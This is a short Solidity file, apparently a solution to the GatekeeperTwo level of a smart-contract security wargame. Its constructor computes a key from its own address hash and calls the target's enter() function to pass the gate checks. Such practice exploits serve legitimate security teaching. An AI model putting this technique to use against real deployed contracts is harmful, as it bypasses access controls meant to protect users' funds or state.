// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo victim;

    constructor(address _victim) {
        victim = GatekeeperTwo(_victim);
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^
            type(uint64).max;

        victim.enter(bytes8(gateKey));
    }
}
